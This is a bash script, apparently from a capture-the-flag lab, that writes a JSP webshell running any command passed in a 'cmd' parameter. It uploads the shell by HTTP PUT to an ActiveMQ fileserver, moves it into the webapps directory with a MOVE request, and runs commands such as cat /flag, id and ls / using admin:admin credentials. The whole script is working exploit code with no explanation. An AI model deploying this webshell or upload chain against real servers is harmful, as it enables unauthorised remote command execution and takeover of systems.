# Proper JSP webshell 
cat << 'JSPEOF' > /tmp/proper_shell.jsp
<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("cmd");
  if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null) {
      out.println(line);
    }
  }
%>
JSPEOF

# PUT to fileserver
curl -s -X PUT --data-binary @/tmp/proper_shell.jsp http://192.168.100.2:8161/fileserver/proper.txt -w 'PUT: %{http_code}\n'

# MOVE to API webapp
curl -s -X MOVE -H 'Destination: file:///opt/activemq/webapps/api/proper.jsp' http://192.168.100.2:8161/fileserver/proper.txt -w 'MOVE: %{http_code}\n'

# Execute
curl -s -u admin:admin "http://192.168.100.2:8161/api/proper.jsp?cmd=cat+/flag"

# Test if JSP is working with different commands to verify
cat << 'JSPEOF' > /tmp/test.jsp
<%@ page import="java.io.*" %>
<% 
String cmd = request.getParameter("cmd");
if(cmd != null) {
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while((line = br.readLine()) != null) { out.println(line); }
BufferedReader br2 = new BufferedReader(new InputStreamReader(p.getErrorStream()));
while((line = br2.readLine()) != null) { out.println("ERR:" + line); }
}
%>
JSPEOF

curl -s -X PUT --data-binary @/tmp/test.jsp http://192.168.100.2:8161/fileserver/b1.txt -w 'PUT: %{http_code}\n'
curl -s -X MOVE -H 'Destination: file:///opt/activemq/webapps/api/b1.jsp' http://192.168.100.2:8161/fileserver/b1.txt -w 'MOVE: %{http_code}\n'

echo "=== id ==="
curl -s -u admin:admin "http://192.168.100.2:8161/api/b1.jsp?cmd=id"
echo ""
echo "=== ls / ==="
curl -s -u admin:admin "http://192.168.100.2:8161/api/b1.jsp?cmd=ls+/"
